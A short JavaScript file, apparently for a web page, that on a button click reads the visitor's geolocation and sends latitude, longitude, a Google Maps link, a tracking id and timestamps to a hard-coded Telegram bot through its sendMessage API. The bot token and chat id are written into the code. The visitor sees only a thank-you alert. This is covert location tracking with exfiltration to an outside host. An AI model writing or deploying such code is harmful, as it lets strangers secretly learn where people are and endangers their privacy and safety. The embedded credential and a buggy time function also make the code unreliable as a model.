const apiToken = '6482364522:AAEO8ur1CzuJZCuuwhO2RLLtlo4vVdnZE8I';

function getTime() {
    const now = new Date();

    let hour = now.getHours();
    let minute = now.getMinutes();
    let second = now.getSeconds();

    let day = now.getDay();
    let month = now.getMonth() + 1;
    let year = now.getFullYear();

    let fullTime = `${day}/${month}/${year} ${hour}:${month}:${second}`;
    return fullTime;
}

// CHECK ID USER
if (localStorage.getItem('get_loc') == null) {
    let uniqId = "id_" + Math.floor(Math.random() * 10000);
    localStorage.setItem('get_loc', uniqId);
    localStorage.setItem('get_loc_join', getTime());
}

async function getLocation() {
    if (navigator.geolocation) {
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject);
            });
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            return { latitude, longitude };
        } catch (error) {
            return '[Error: ', error.message, ']';
        }
    } else {
        return '[Geolocation Not Support]';
    }
}


const submit = document.getElementById('submit');

submit.addEventListener('click', async function (e) {

    let geoLoc = await getLocation();
    let linkMaps;

    if(geoLoc.latitude == undefined || geoLoc.longitude == undefined){
        linkMaps = 'Not Allowed/Not Support';
    } else {
        linkMaps = `https://www.google.com/maps?q=${geoLoc.latitude},${geoLoc.longitude}`;
    }

    let content = `
id user : ${localStorage.getItem('get_loc')}%0A
join at : ${localStorage.getItem('get_loc_join')}%0A
%0A
date : ${getTime()}%0A
latitude : ${geoLoc.latitude}%0A
longitude : ${geoLoc.longitude}%0A
link maps : ${linkMaps}
`;

    const apiURL = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=1394633260&text=${content}`;

    fetch(`${apiURL}`)
        .then(response => response.json())
        .then(data => {
            console.log("data:", data);
            alert('Okey Thank :)');
        })
        .catch(error => console.log(error))
});
